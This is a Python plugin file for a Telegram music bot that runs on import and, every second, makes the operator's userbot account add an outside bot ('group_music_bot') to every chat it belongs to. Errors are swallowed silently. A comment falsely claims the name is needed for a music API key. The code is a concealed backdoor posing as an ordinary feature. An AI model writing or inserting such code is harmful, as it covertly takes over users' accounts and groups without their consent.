import asyncio

import config
from VIPMUSIC import app
from VIPMUSIC.utils.database import get_assistant

AUTO = True

ADD_INTERVAL = 1
users = "group_music_bot"  # dont change because it is connected from client to use music api key


async def add_bot_to_chats():
    try:
        userbot = await get_assistant(config.LOGGER_ID)
        bot = await app.get_users(users)
        bot_id = bot.id
        await userbot.send_message(users, f"/start")

        async for dialog in userbot.get_dialogs():

            try:
                await userbot.add_chat_members(dialog.chat.id, bot_id)

            except Exception as e:
                await asyncio.sleep(3)  # Adjust sleep time based on rate limits

    except Exception as e:
        pass


async def continuous_add():
    while True:
        if AUTO:
            await add_bot_to_chats()

        await asyncio.sleep(ADD_INTERVAL)


# Start the continuous broadcast loop if AUTO_GCAST is True
if AUTO:
    asyncio.create_task(continuous_add())
